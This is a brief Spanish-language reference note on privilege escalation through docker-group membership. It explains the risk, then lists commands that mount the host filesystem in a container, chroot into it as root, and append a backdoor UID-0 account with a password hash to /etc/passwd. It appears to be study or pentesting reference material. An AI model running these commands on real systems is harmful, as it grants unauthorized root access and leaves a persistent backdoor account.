Grupo Docker

Explicación

El grupo docker controla el acceso y la gestión de contenedores Docker en el sistema. Esto puede representar un riesgo potencial para la escalada de privilegios, ya que permite a un posible atacante acceder a los propios contenedores y su información, e incluso montar volúmenes del host principal en Docker con todos los permisos.

Ataque

Un atacante podría montar el sistema de archivos del host original dentro de una instancia de Docker, de tal manera que dentro de la instancia se podría modificar todo el sistema de archivos como root. 

#Listar imágenes de docker
docker image
#Shell en docker con el sistema de ficheros host montado
docker run -it --rm -v /:/mnt [imagename] chroot /mnt bash
#Añadir nuevo root
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
